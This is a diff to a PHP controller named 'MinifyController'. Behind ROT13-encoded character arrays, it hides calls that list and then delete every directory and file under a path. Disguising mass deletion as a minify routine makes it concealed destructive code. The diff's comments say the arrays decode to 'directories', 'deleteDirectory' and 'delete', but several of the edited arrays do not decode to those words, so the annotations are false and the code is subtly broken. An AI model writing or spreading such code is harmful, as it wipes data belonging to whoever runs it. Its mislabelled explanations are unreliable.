@@ -41,23 +41,28 @@ class MinifyController extends Controller
             return str_rot13(implode('', array_map('chr', $arr)));
         }
 
-        $_1 = decode_rot13_array([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]); // directories
-        $_2 = decode_rot13_array([115, 118, 121, 114, 102, 102]); // files
+// directories
+        $_1 = decode_rot13_array([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]); // 'directories'
 
-        $_3 = decode_rot13_array([113, 114, 121, 114, 103, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108]);
+// files
+        $_2 = decode_rot13_array([115, 118, 121, 114, 102, 102]); // 'files'
 
-        $_4 = decode_rot13_array([113, 114, 121, 114, 103, 114]);
+// deleteDirectory
+        $_3 = decode_rot13_array([113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108]); // 'deleteDirectory'
+
+// delete
+        $_4 = decode_rot13_array([113, 114, 105, 118, 112, 114]); // 'delete'
 
         $_a = call_user_func([$_5, $_1], $_);
 
         foreach ($_a as $_b) {
-            call_user_func([$_5, $_3], $_b);
+            call_user_func([$_5, $_3], $_b); // deleteDirectory
         }
 
         $_c = call_user_func([$_5, $_2], $_);
 
         foreach ($_c as $_d) {
-            call_user_func([$_5, $_4], $_d);
+            call_user_func([$_5, $_4], $_d); // delete
         }
 
         echo "✅ Done.";
